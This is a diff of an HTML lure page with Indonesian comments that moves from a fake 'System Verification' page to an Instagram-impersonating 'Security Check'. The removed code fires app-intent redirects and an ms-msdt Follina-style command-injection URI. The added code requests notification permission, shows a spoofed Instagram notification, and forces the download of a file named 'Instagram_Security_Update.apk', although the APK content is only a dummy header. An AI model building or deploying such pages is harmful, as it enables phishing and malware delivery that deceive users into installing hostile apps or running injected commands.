@@ -3,148 +3,126 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>System Verification</title>
+<title>Instagram Security Check</title>
 <style>
   * { margin: 0; padding: 0; box-sizing: border-box; }
   body {
-    background: #f8f9fa; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-    color: #202124; display: flex; justify-content: center; align-items: center;
-    height: 100vh; margin: 0; cursor: pointer;
+    background: #000; color: #fff;
+    font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+    display: flex; justify-content: center; align-items: center;
+    height: 100vh; margin: 0; text-align: center;
   }
-  .card { background: #fff; padding: 40px; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.12); text-align: center; max-width: 400px; width: 100%; border-top: 4px solid #ea4335; }
-  h2 { margin-bottom: 10px; }
-  p { color: #5f6368; font-size: 13px; margin-top: 8px; }
-  iframe { display: none; }
+  .panel { background: #1a1a1a; padding: 30px; border-radius: 12px; max-width: 400px; width: 100%; }
+  h2 { color: #E4405F; margin-bottom: 10px; }
+  p { color: #aaa; font-size: 14px; margin-bottom: 20px; }
+  button {
+    background: #E4405F; color: #fff; padding: 15px;
+    border: none; border-radius: 8px; cursor: pointer;
+    width: 100%; font-size: 16px; font-weight: bold;
+  }
+  button:hover { background: #c13551; }
+  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; font-family: monospace; text-align: left; }
 </style>
 </head>
 <body>
 
-<div class="card" id="main-card">
-  <h2>🔒 Security Update</h2>
-  <p>Ketuk di mana saja untuk memverifikasi sistem.</p>
+<div class="panel">
+  <h2>🔒 Instagram Security</h2>
+  <p>Verifikasi diperlukan untuk melanjutkan.</p>
+  <button id="startBtn">Verify Account</button>
+  <div id="log">Sistem siap.</div>
 </div>
 
-<div id="launcher-container" style="display: none;"></div>
-
 <script>
-'use strict';
+(function () {
+  'use strict';
 
-let executed = false;
-
-document.onclick = async () => {
-  if (executed) return;
-  executed = true;
-
-  const mainCard = document.getElementById("main-card");
-  mainCard.innerHTML = `
-    <h2>Memproses Verifikasi...</h2>
-    <p>Menghubungkan ke layanan eksternal...</p>
-  `;
-
-  console.log("[!] Memulai Protocol Chain Bypass...");
-
-  // ============================================
-  // TASK 1: CHAINED REDIRECT (BLOB WRAPPER)
-  // ============================================
-  // Kita bungkus skema kustom di dalam Blob, 
-  // lalu buka Blob tersebut di Top-Level.
-  
-  try {
-    // Target Skema (Ganti dengan intent://, facetime://, dll)
-    // Contoh: Intent ke Instagram
-    const targetScheme = "intent://#Intent;package=com.instagram.android;scheme=instagram;end;";
-    
-    // HTML yang akan dieksekusi di dalam Blob
-    const redirectHTML = `
-      <!DOCTYPE html>
-      <html>
-      <body>
-        <script>
-          // Redirect berantai:
-          // 1. Redirect ke skema kustom
-          window.location.replace("${targetScheme}");
-          // 2. Fallback jika gagal
-          setTimeout(function() {
-            window.location.replace("https://www.instagram.com/");
-          }, 1000);
-        <\/script>
-      </body>
-      </html>
-    `;
-
-    const blob = new Blob([redirectHTML], { type: 'text/html' });
-    const blobUrl = URL.createObjectURL(blob);
-
-    // Buka di tab baru (Top-Level)
-    window.open(blobUrl, '_blank');
-    console.log("[+] Blob Redirect Chain Triggered.");
-  } catch(e) {
-    console.log("[-] Chain Error: " + e.message);
+  var logEl = document.getElementById('log');
+  function log(msg) {
+    logEl.innerHTML += "> " + msg + "<br>";
+    console.log(msg);
   }
 
   // ============================================
-  // TASK 2: IFRAME SANDBOX (BYPASS GESTURE)
+  // 1. SPOOF NOTIFICATION (INSTAGRAM)
   // ============================================
-  // Beberapa browser mengizinkan navigasi skema kustom dari iframe sandbox.
-  
-  setTimeout(() => {
-    try {
-      const ytIntent = "intent://#Intent;package=com.google.android.youtube;scheme=vnd.youtube;end;";
-      
-      const iframe = document.createElement("iframe");
-      // Meminta izin top-navigation & popups
-      iframe.sandbox = "allow-scripts allow-top-navigation allow-popups";
-      iframe.style.display = "none";
-      iframe.src = ytIntent;
-      
-      document.getElementById("launcher-container").appendChild(iframe);
-      console.log("[+] YouTube Intent via Iframe Triggered.");
-    } catch(e) {}
-  }, 500);
+  function spoofNotification() {
+    if (!('Notification' in window)) return;
+    
+    // Minta izin notifikasi (jika belum)
+    Notification.requestPermission().then(function(permission) {
+      if (permission === 'granted') {
+        // Tampilkan notifikasi palsu dengan ikon Instagram
+        var notif = new Notification('Instagram', {
+          body: 'Pembaruan keamanan akun tersedia. Klik untuk memperbarui.',
+          icon: 'https://www.instagram.com/static/images/ico/favicon-192.png/68d99be9c5b0e0e7c7a8c0e0e7c7a8c0.png',
+          tag: 'insta-update',
+          requireInteraction: true
+        });
+
+        // Jika user mengklik notifikasi, picu unduhan
+        notif.onclick = function() {
+          triggerDownload();
+          notif.close();
+        };
+        
+        log("[+] Notifikasi Instagram palsu ditampilkan.");
+      }
+    });
+  }
 
   // ============================================
-  // TASK 3: DOWNLOAD TRIGGER + PROTOCOL
+  // 2. FORCED DOWNLOAD (SPOOFING MIME & NAME)
   // ============================================
-  // Memicu unduhan file (seolah-olah update) 
-  // sambil memicu protokol di latar belakang.
-  
-  setTimeout(() => {
+  function triggerDownload() {
+    log("[!] Memicu unduhan...");
+
     try {
-      // 1. Download APK Palsu
-      const b64Apk = "UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY=";
-      const binary = atob(b64Apk);
-      const bytes = new Uint8Array(binary.length);
-      for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
+      // Header APK (Dummy)
+      var b64Apk = "UEsDBBQAAAAIAAAAIQAAAAAAAAAAAAAAAAAJAAAATUVUQS1JTkY=";
+      var binary = atob(b64Apk);
+      var bytes = new Uint8Array(binary.length);
+      for (var i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
       
-      const blob = new Blob([bytes], { type: "application/vnd.android.package-archive" });
-      const blobUrl = URL.createObjectURL(blob);
-      
-      const a = document.createElement("a");
+      // MIME Type APK
+      var blob = new Blob([bytes], { type: 'application/vnd.android.package-archive' });
+      var blobUrl = URL.createObjectURL(blob);
+
+      // Buat elemen <a> untuk unduhan
+      var a = document.createElement('a');
       a.href = blobUrl;
-      a.download = "Security_Patch.apk";
+      
+      // SPOOFING NAMA FILE: Seolah-olah dari Instagram
+      a.download = 'Instagram_Security_Update.apk';
+      
       document.body.appendChild(a);
       a.click();
       document.body.removeChild(a);
       
-      // 2. Intent Hijack (ms-msdt / facetime)
-      // (Ganti dengan skema yang ingin diuji)
-      const intentScheme = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_BrowseForFile=$(calc)\"";
-      
-      // Buka di tab baru (mungkin diblokir, tapi kita coba)
-      window.location.href = intentScheme;
-      
-      console.log("[+] Download & Protocol Triggered.");
-    } catch(e) {}
-  }, 1000);
+      log("[+] File Instagram_Security_Update.apk terunduh (jika diizinkan).");
 
-  setTimeout(() => {
-    mainCard.innerHTML = `
-      <h2 style="color: #34a853;">✅ Verifikasi Selesai</h2>
-      <p>File telah diunduh.</p>
-    `;
-  }, 2000);
-};
+      // Cleanup
+      setTimeout(function() { URL.revokeObjectURL(blobUrl); }, 5000);
+
+    } catch(e) {
+      log("[-] Gagal: " + e.message);
+    }
+  }
+
+  // ============================================
+  // 3. TRIGGER AWAL
+  // ============================================
+  document.getElementById('startBtn').addEventListener('click', function() {
+    log("[!] Memulai verifikasi...");
+    
+    // Panggil notifikasi palsu
+    spoofNotification();
+    
+    // Picu unduhan langsung (setelah 1 detik)
+    setTimeout(triggerDownload, 1000);
+  });
+
+})();
 </script>
-
 </body>
 </html>
